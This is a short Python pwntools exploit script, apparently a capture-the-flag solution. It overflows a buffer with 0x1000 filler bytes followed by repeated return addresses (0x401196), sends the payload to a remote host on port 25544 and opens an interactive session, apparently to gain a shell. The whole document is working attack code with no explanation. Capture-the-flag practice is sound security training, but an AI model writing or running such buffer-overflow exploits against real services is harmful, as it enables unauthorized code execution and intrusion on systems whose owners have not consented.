from pwn import *

buf = 'a' * (0x1000) + p64(0x401196).decode("unicode_escape")+ p64(0x401196).decode("unicode_escape")+ p64(0x401196).decode("unicode_escape")+ p64(0x401196).decode("unicode_escape")+ p64(0x401196).decode("unicode_escape")

p = remote("gxh191.top", 25544)

p.sendline(buf)

p.interactive()